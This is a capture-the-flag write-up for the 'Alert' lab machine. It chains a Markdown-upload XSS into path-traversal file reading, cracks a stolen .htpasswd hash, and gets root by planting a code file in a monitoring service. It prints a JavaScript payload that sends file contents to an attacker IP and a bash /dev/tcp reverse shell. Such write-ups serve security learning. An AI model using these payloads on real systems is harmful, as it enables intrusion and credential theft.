![Alert](Alert_images/pwned.png)

Alert was an engaging box that required exploiting a Markdown file upload vulnerability and leveraging XSS to achieve Local File Inclusion (LFI). By tricking an administrator into executing a malicious payload, I retrieved hashed credentials from an internal subdomain and cracked them to gain SSH access as Albert. Privilege escalation was achieved by modifying a writable configuration file within a locally running web monitoring service, injecting a reverse shell to gain root. This box emphasized the risks of improper input validation, exposed internal services, and misconfigured file permissions.

# User flag

![nmap](Alert_images/nmap.png)

Nmap scan reveals only two ports. I'll check the revealed website.

![markdownviewer](Alert_images/markdownviewer.png)

This website provides a file upload functionality. Looking at the source code, I can see that only .md files are accedpted and that there is a .php script taking the uploaded files. There is also a contact form.

```
# Source

                <input type="submit" value="View Markdown">

    </footer>
</body>
</html>
```

Any attempt to upload a file that is not a .md file would end up with a 'Error: File must be a Markdown file (.md). ' error.

Having no leads to check, I began fuzzing for subdomains and searching for directories.

![ffuf](Alert_images/ffuf.png)

Found a statistics subdomain.

![nonew](Alert_images/nonew.png)

And a bunch of files. The subdomain requires credentials to access, so I wont be able to just check the files.

## LFI via XSS

I tested whether inputting links into the message form would bring any results, and it did!

![hit](Alert_images/hit.png)

Someone clicked the link as soon as I sent it. It may be possible to snatch something from the person on the other side, or maybe a file?

```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.2:80/?file_content=" + encodeURIComponent(data));
  });
</script>
```
This script should send me back the contents of .htpasswd, as the file parameter is not sanitized at all.

After uploading the .md file, I noticed a share link in the bottom left of the screen.

![share](Alert_images/share.png)

I'll copy the link and send it over to the contact form.

![data](Alert_images/data.png)

What came back is URL encoded data! I'll decode it using cyberchef.

```
%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A > <pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
```
Its a hash! I'll send it over to hashcat for some quick cracking.

```
hashcat -a 0 hash.txt /home/kali/Downloads/rockyou.txt --username
```

I have the credentials for Albert! I'll try to SSH into the box now.

![user](Alert_images/user.png)

# Privilege escalation

![ss](Alert_images/ss.png)

During my recon, I noticed a service running locally at port 8080. I'll forward the port and check it out.

```
ssh -L 8080:127.0.0.1:8080 albert@10.10.11.44
```
![webmon](Alert_images/webmon.png)

Its a website monitor page. Not much to see here, but I'll keep it in mind.

Inside the web monitor's directory on the box, I found something interesting.

![info](Alert_images/info.png)

Since Albert is a member of the management group, he can write into the config file. I'll poison the file with a reverse shell script, which should grant me a root reverse shell!

```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/IP/PORT 0>&1'");
?>
```

![root](Alert_images/root.png)

Rooted!
